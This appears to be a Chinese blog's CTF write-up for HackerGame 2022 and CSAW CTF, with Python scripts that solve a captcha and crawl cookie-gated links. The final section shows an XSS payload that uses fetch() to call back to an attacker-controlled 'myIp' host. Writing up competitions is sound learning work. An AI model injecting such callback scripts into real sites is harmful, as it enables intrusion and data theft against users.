@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="ctf, solution, note, blog">
+    
+    <meta name="author" content="Forestsetyou">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://forestsetyou.github.io/2022/11/19/security/ctf/ctf比赛复盘（三）/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="false">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF比赛复盘（三）">
+<meta property="og:url" content="http://forestsetyou.github.io/2022/11/19/Security/CTF/CTF%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98%EF%BC%88%E4%B8%89%EF%BC%89/index.html">
+<meta property="og:site_name" content="Festu&#39;s Blog">
+<meta property="og:description" content="false">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-11-19T10:55:00.000Z">
+<meta property="article:modified_time" content="2023-01-11T08:19:00.000Z">
+<meta property="article:author" content="Forestsetyou">
+<meta property="article:tag" content="ctf, solution, note, blog">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/hide_imgs/smiling_face.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/hide_imgs/smiling_face.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/hide_imgs/smiling_face.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            CTF比赛复盘（三） -
+        
+        Festu&#39;s Blog
+    </title><meta name="robots" content="noindex">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Festu&#39;s Blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"forestsetyou.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/hide_imgs/light_banner-5.png","dark":"/hide_imgs/dark_banner.png"},"title":"Festu's Blog","subtitle":{"text":["Life Goes On."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":false},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Forestsetyou","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"categories":{"path":"/categories","icon":"fa-regular fa-folder"},"tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/03/11 03:27:59"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/hide_imgs/smiling_face.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Festu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/hide_imgs/post_thumbnail.png" alt="CTF比赛复盘（三）" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">CTF比赛复盘（三）</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/hide_imgs/avatar.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Forestsetyou</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2022-11-19 18:55</span>
+        <span class="mobile">2022-11-19 18:55</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-01-11 16:19</span>
+            <span class="mobile">2023-01-11 16:19</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Security/">Security</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Security/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="HackerGame-2022"><a href="#HackerGame-2022" class="headerlink" title="HackerGame-2022"></a>HackerGame-2022</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Xcaptcha"><a href="#Xcaptcha" class="headerlink" title="Xcaptcha"></a>Xcaptcha</h3><p>人机测试（bushi），要在一秒内回答三道特别大数字的加法问题来获得flag，编写脚本爬虫即可解决。首先要获取题目的html格式信息来提取加法问题，在访问题目网址之前要加上账号认证的cookie，格式为”session:xxxx”，具体内容可以在访问题目网址时抓包得到。访问后会发现加法题目信息在 <code>&lt;label for=\&quot;captcha1\&quot;&gt;</code> 标签中，共有三个题目三个标签，一一获取后计算得到答案，再传给服务器即可获得flag。发送答案的包格式也可以抓包获取，使用post上传”captcha1-3”三个键的值即可。脚本如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">cookie=&#123;<span class="string">&#x27;session&#x27;</span>:<span class="string">&quot;.eJwdkEtLQnEQxb_LXV9o3g-hxTVchIna64o7JSuzEkVRib57_xsMs5kz53c4P9VhdT5UvQrNTNANWDhIKdNqJlDRZMEQciKDCNHoNqWyAySZQY3dZ7qgigEQMhNTehnhYgugropZdwizzJQgwwBVc1QQtYxw_xdR1GrGiaQAUWCmRZPqFpEF0t3ImbWkI6MgN03JYsMCgIrmTIEF4kDiwDWmZQdJYmQxVkB3Qw8uGVJFlBUdq7o6bDer764LoOiNBk83tzfN_PZtvG_z2K6_HmcrGc5i-LKkq-d2Mm4_cISz3Xz4vhwcLs160JzfN58Pq7bfHnc4nb9yM3ubNDRaTLf7nfP9Yny5659P0S6b03X1-wchu1ws.Y1ODyQ.eH6ZK6FOisgl_WCDbqTlPPngAvQ&quot;</span>&#125;</span><br><span class="line">req=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://202.38.93.111:10047/xcaptcha&quot;</span></span><br><span class="line">html=req.get(url,cookies=cookie)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(html.text)</span><br><span class="line"></span><br><span class="line">captcha1=re.findall(<span class="string">&#x27;&lt;label for=\&quot;captcha1\&quot;&gt;([0-9]*\+[0-9]*)&#x27;</span>,html.text)</span><br><span class="line">captcha2=re.findall(<span class="string">&#x27;&lt;label for=\&quot;captcha2\&quot;&gt;([0-9]*\+[0-9]*)&#x27;</span>,html.text)</span><br><span class="line">captcha3=re.findall(<span class="string">&#x27;&lt;label for=\&quot;captcha3\&quot;&gt;([0-9]*\+[0-9]*)&#x27;</span>,html.text)</span><br><span class="line">cap1=<span class="built_in">eval</span>(captcha1[<span class="number">0</span>])</span><br><span class="line">cap2=<span class="built_in">eval</span>(captcha2[<span class="number">0</span>])</span><br><span class="line">cap3=<span class="built_in">eval</span>(captcha3[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">ans=&#123;</span><br><span class="line">    <span class="string">&quot;captcha1&quot;</span>:cap1,</span><br><span class="line">    <span class="string">&quot;captcha2&quot;</span>:cap2,</span><br><span class="line">    <span class="string">&quot;captcha3&quot;</span>:cap3</span><br><span class="line">&#125;</span><br><span class="line">html=req.post(url,data=ans)</span><br><span class="line"><span class="built_in">print</span>(html.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>得到flag：<code>flag&#123;head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_619b077f58&#125;</code></p>
+<h3 id="家目录里的秘密"><a href="#家目录里的秘密" class="headerlink" title="家目录里的秘密"></a>家目录里的秘密</h3><h4 id="VSC中的flag"><a href="#VSC中的flag" class="headerlink" title="VSC中的flag"></a>VSC中的flag</h4><p>flag在uer目录下的.config文件夹中，由于 <code>grep -r flag ./*</code> 命令不能包括隐藏文件，因此要么逐个文件夹尝试，要么直接使用VSCode打开该文件夹，然后全局搜索flag字符串。</p>
+<h4 id="Rclone里的flag"><a href="#Rclone里的flag" class="headerlink" title="Rclone里的flag"></a>Rclone里的flag</h4><p>猜测flag在rclone配置文件flag2模块的密码中，rclone采用简单的可逆加密来对密码进行简单的替换，因此flag应该就在密码解密后的内容中，但不知道如何对密码进行解密。</p>
+<h3 id="旅行照片2-0"><a href="#旅行照片2-0" class="headerlink" title="旅行照片2.0"></a>旅行照片2.0</h3><h4 id="照片分析"><a href="#照片分析" class="headerlink" title="照片分析"></a>照片分析</h4><p>exif信息使用ExifTool工具查看，或者直接右键文件查看属性也可以（信息足够，但是有歧义，属性中ISO标记为ISO速度让人摸不着头脑。有问题的时第一问，EXIF版本信息为0231，但答案是2.31…</p>
+<h4 id="社工实践"><a href="#社工实践" class="headerlink" title="社工实践"></a>社工实践</h4><p>红米note9 4G 2340x1080</p>
+<p>APA 东京湾幕张度假酒店：日本千叶县千叶市美浜区</p>
+<p>圆形建筑为千叶海洋球场，球场在酒店西面，飞机往北飞</p>
+<p>起飞点为羽田国际机场</p>
+<p>(HND) Haneda Airport Departures</p>
+<h1 id="CSAWCTF"><a href="#CSAWCTF" class="headerlink" title="CSAWCTF"></a>CSAWCTF</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Word-wide-web"><a href="#Word-wide-web" class="headerlink" title="Word wide web"></a>Word wide web</h3><p>使用爬虫截取返回信息，用正则匹配寻找有效的 <code>&lt;a</code> 标签，匹配href后的路径并重复访问，直到找到flag。网页会用cookie检测用户，相应头中有字段 “Set-Cookie” 表示新cookie的值，将cookie设置为相应的值后再次发送即可完成认证，最后停止即可得到flag</p>
+<p>手动设置cookie：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://web.chal.csaw.io:5010&quot;</span></span><br><span class="line">reg=<span class="string">&quot;/stuff&quot;</span></span><br><span class="line">ck=&#123;<span class="string">&quot;solChain&quot;</span>:<span class="string">&quot;stuff&quot;</span>&#125;</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    strhtml = requests.get(url+reg,cookies=ck)  <span class="comment">#设置cookie</span></span><br><span class="line">    regs=re.findall(<span class="string">&quot;&lt;a href=\&quot;(/[^&gt;\&quot;]*)\&quot;&gt;&quot;</span>,strhtml.text) <span class="comment">#寻找href</span></span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    headers=strhtml.headers</span><br><span class="line">    <span class="built_in">print</span>(headers)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">        reg_one=re.findall(<span class="string">&quot;solChain=([^;]*)&quot;</span>,headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])    <span class="comment">#提取新cookie</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(cnt)</span><br><span class="line">        <span class="built_in">print</span>(strhtml.text) <span class="comment">#回显flag</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no cookie!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    ck[<span class="string">&quot;solChain&quot;</span>]=reg_one[<span class="number">0</span>]   <span class="comment">#设置cookie</span></span><br><span class="line">    <span class="built_in">print</span>(ck)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(regs)==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(cnt)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        reg=regs[<span class="number">0</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>用session保持会话自动存储cookie：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">req=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://web.chal.csaw.io:5010&quot;</span></span><br><span class="line">reg=<span class="string">&quot;/stuff&quot;</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    strhtml = req.get(url+reg)  <span class="comment">#设置cookie</span></span><br><span class="line">    regs=re.findall(<span class="string">&quot;&lt;a href=\&quot;(/[^&gt;\&quot;]*)\&quot;&gt;&quot;</span>,strhtml.text) <span class="comment">#寻找href</span></span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(regs)==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(cnt)</span><br><span class="line">        <span class="built_in">print</span>(strhtml.text) <span class="comment">#回显flag</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        reg=regs[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="My-little-website"><a href="#My-little-website" class="headerlink" title="My little website"></a>My little website</h3><p>先访问自己的服务器，关闭一下防火墙先：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/vicowong/p/11210144.html" >CentOS-firewalld防火墙设置 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line">fetch(&#x27;http://myIp:23333&#x27;);</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>
+
